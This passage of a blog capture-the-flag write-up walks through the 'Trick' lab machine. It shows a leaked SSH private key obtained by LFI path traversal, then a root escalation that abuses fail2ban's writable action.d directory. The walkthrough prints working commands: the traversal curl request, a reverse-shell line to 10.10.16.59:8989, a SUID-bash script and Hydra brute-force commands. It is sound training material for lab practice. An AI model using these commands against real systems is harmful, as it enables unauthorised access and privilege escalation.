+</span></span><span style="display:flex;"><span>hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
+</span></span><span style="display:flex;"><span>jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
+</span></span><span style="display:flex;"><span>IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
+</span></span><span style="display:flex;"><span>aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
+</span></span><span style="display:flex;"><span>KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
+</span></span><span style="display:flex;"><span>tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
+</span></span><span style="display:flex;"><span>U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
+</span></span><span style="display:flex;"><span>fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
+</span></span><span style="display:flex;"><span>PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
+</span></span><span style="display:flex;"><span>3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
+</span></span><span style="display:flex;"><span>fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
+</span></span><span style="display:flex;"><span>AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
+</span></span><span style="display:flex;"><span>In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
+</span></span><span style="display:flex;"><span>JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
+</span></span><span style="display:flex;"><span>jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
+</span></span><span style="display:flex;"><span>IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><p>And it worked, so now I&rsquo;ll be able to <em>SSH</em> into the server as user <em>michael</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>....//....//....//....//....//....//....//home/michael/.ssh/id_rsa &gt; michael_id_rsa
+</span></span><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">600</span> michael_id_rsa
+</span></span><span style="display:flex;"><span>$ ssh -i michael_id_rsa michael@trick.htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Linux trick 4.19.0-20-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Fri Oct <span style="color:#ae81ff">28</span> 17:15:31 <span style="color:#ae81ff">2022</span> from 10.10.14.105
+</span></span><span style="display:flex;"><span>michael@trick:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>security<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>michael@trick:~$ cat user.txt
+</span></span><span style="display:flex;"><span>043**************************bda
+</span></span></code></pre></div><h2 id="post-enumeration">Post Enumeration</h2>
+<p>I can see that <em>michael</em> is part of <em>security</em> group (using <code>id</code> command), and if I run <code>sudo -l</code> I get the following results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> michael on trick:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User michael may run the following commands on trick:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /etc/init.d/fail2ban restart
+</span></span></code></pre></div><p>User <em>michael</em> can restart <a href="https://www.fail2ban.org/wiki/index.php/Main_Page"><em>fail2ban</em></a> service, which is a service that monitors log files for certain services like apache and SSH looking for any sign of bruteforce and blocks the corresponding IP address.
+In addition, if I search for files owned by <em>security</em> group:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ find / -group security 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/etc/fail2ban/action.d
+</span></span></code></pre></div><p>I can see that <em>action.d</em> directory of <a href="https://www.fail2ban.org/wiki/index.php/Main_Page"><em>fail2ban</em></a> service is owned by security group, so I might be able to abuse this for privilege escalation to root.</p>
+<h2 id="getting-root">Getting root</h2>
+<ul>
+<li>References:
+<ul>
+<li>How fail2ban exactly works (config files &hellip;): <a href="https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server">https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server</a></li>
+<li><em>Abuse</em> write permission to files inside <em>action.d</em> folder: <a href="https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/">https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/</a></li>
+</ul>
+</li>
+</ul>
+<p>Even though I have write permission on <em>action.d</em> directory, I do not have write permission to any file inside it, which means that I cannot override any file, however I can <em>create</em> and <em>move</em> files around (or better said <em>rename</em> files).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:/etc/fail2ban/action.d$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">288</span>
+</span></span><span style="display:flex;"><span>drwxrwx--- <span style="color:#ae81ff">2</span> root security  <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">28</span> 18:21 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">6</span> root root      <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">28</span> 18:21 ..
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">3879</span> Oct <span style="color:#ae81ff">28</span> 18:21 abuseipdb.conf
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root       <span style="color:#ae81ff">587</span> Oct <span style="color:#ae81ff">28</span> 18:21 apf.conf
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">1045</span> Oct <span style="color:#ae81ff">28</span> 18:21 ufw.conf
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">6082</span> Oct <span style="color:#ae81ff">28</span> 18:21 xarf-login-attack.conf
+</span></span></code></pre></div><ul>
+<li>Files are only <em>writable</em> by root.</li>
+</ul>
+<p>From the jail configuration file (<em>/etc/fail2ban/jail.conf</em>), I can see:</p>
+<pre tabindex="0"><code>...
+bantime  = 10s
+...
+findtime  = 10s
+...
+maxretry = 5
+...
+banaction = iptables-multiport
+...
+</code></pre><p>Which means that the <em>ban action</em> will be triggered upon <em>5 unsuccessful login within 10 seconds</em> and will last for 10 seconds. And the file responsible for the ban action is <em>iptables-multiport.conf</em> (will get <em>executed</em> when <em>bruteforce</em> is detected).</p>
+<p>So:</p>
+<ul>
+<li>I can <em>rename</em> the orginal file to <em>iptables-multiport.conf.bak</em> and <em>create</em> a new file that has the <em>same name and contents</em> in addition to my malicious code.</li>
+<li>Change the permission of the file to be executable.</li>
+<li>Then restart the service with <em>sudo</em> permission.</li>
+<li>Finally trigger the ban action using <a href="https://github.com/vanhauser-thc/thc-hydra"><em>Hydra</em></a> or any other tool for bruteforcing.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ cat pwn_reverse_shell.sh 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. rename the file</span>
+</span></span><span style="display:flex;"><span>mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. substitute the word `actionban` from the config file with `actionban = bash -c &#34;bash -i&gt;&amp; /dev/tcp/10.10.16.59/8989 0&gt;&amp;1&#34; \n#` to get a reverse shell</span>
+</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#39;s/actionban/actionban = bash -c &#34;bash -i&gt;\&amp; \/dev\/tcp\/10.10.16.59\/8989 0&gt;\&amp;1&#34; \n#/&#39;</span> /etc/fail2ban/action.d/iptables-multiport.conf.bak &gt; /etc/fail2ban/action.d/iptables-multiport.conf
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. make the file executable and restart fail2ban service</span>
+</span></span><span style="display:flex;"><span>chmod +x /etc/fail2ban/action.d/iptables-multiport.conf
+</span></span><span style="display:flex;"><span>sudo /etc/init.d/fail2ban restart
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ cat pwn_SUID.sh 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. rename the file</span>
+</span></span><span style="display:flex;"><span>mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. substitute the word `actionban` from the config file with `actionban = cp /bin/bash /tmp/newbash &amp;&amp; chmod u+s /tmp/newbash \n#` to get a new SUID bash executable in /tmp/ directory</span>
+</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#39;s/actionban/actionban = cp \/bin\/bash \/tmp\/newbash \&amp;\&amp; chmod u+s \/tmp\/newbash \n#/&#39;</span> /etc/fail2ban/action.d/iptables-multiport.conf.bak &gt; /etc/fail2ban/action.d/iptables-multiport.conf
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. make the file executable and restart fail2ban service</span>
+</span></span><span style="display:flex;"><span>chmod +x /etc/fail2ban/action.d/iptables-multiport.conf
+</span></span><span style="display:flex;"><span>sudo /etc/init.d/fail2ban restart
+</span></span></code></pre></div><p>I can either get a reverse shell or make a new <em>bash</em> executable as <em>SUID</em>.</p>
+<ul>
+<li>
+<p>Bruteforce using <a href="https://github.com/vanhauser-thc/thc-hydra"><em>Hydra</em></a>:</p>
+<ul>
+<li><code>hydra -l root -P /usr/share/wordlists/rockyou.txt trick.htb ssh -t 6 -vvv</code></li>
+</ul>
+</li>
+<li>
+<p>Bruteforce using <a href="https://github.com/kevinburke/sshpass"><em>SSHPass</em></a></p>
+<ul>
+<li><code>for i in {1..10}; do  time sshpass -p &quot;test&quot; ssh root@trick.htb; done</code></li>
+</ul>
+</li>
+</ul>
+<p><img src="getting_root.png" alt="Getting root"></p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://mostxeon.github.io/tags/dns/">DNS</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/virtual-host-enumeration/">Virtual-Host-Enumeration</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/lfi/">LFI</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/fail2ban/">Fail2ban</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/bruteforce/">Bruteforce</a></span>
+        
+    </p>
+
+      
+    <p>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-antenna-bars-2" width="19" height="19" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round" id="IconChangeColor"> <path stroke="none" d="M0 0h24v24H0z" fill="none" id="mainIconPathAttribute"></path> <line x1="6" y1="18" x2="6" y2="15"></line> <line x1="10" y1="18" x2="10" y2="18.01"></line> <line x1="14" y1="18" x2="14" y2="18.01"></line> <line x1="18" y1="18" x2="18" y2="18.01"></line> </svg>
+        
+        
+        
+        <span class="difficulty"><a href="https://mostxeon.github.io/difficulty/easy/">Easy</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1955 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2022-10-28 13:44
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fmostxeon.github.io%2fposts%2ftrick%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2ftrick%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Trick&amp;caption=Trick&amp;canonicalUrl=https%3a%2f%2fmostxeon.github.io%2fposts%2ftrick%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=Trick&amp;body=https%3a%2f%2fmostxeon.github.io%2fposts%2ftrick%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2ftrick%2f&amp;media=https%3a%2f%2fmostxeon.github.io%2fposts%2ftrick%2f;description=Trick" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fmostxeon.github.io%2fposts%2ftrick%2f&amp;title=Trick&amp;summary=Trick&amp;source=https%3a%2f%2fmostxeon.github.io%2fposts%2ftrick%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2ftrick%2f&amp;resubmit=true&amp;title=Trick" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fmostxeon.github.io%2fposts%2ftrick%2f;title=Trick" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=Trick%20https%3a%2f%2fmostxeon.github.io%2fposts%2ftrick%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fmostxeon.github.io%2fposts%2ftrick%2f&amp;t=Trick" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Trick&amp;url=https%3a%2f%2fmostxeon.github.io%2fposts%2ftrick%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://mostxeon.github.io/posts/faculty/">
+                    <span class="button__text">Faculty</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer id="socials" class="footer">
